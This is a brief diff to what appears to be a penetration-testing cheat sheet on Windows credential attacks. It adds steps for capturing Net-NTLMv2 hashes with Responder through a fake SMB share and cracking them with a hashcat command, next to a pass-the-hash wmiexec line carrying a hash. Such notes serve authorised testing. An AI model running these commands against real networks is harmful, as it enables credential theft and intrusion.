@@ -20,3 +20,9 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955ab
 
 ### Cracking Net-NTLMv2
 
+extract hash using responder and any smb service with false share
+capture the hash and crack using hashcat
+hashcat -m 5600 sam.hash rockyou.txt --force
+
+### Passing Net-NTLMv2
+
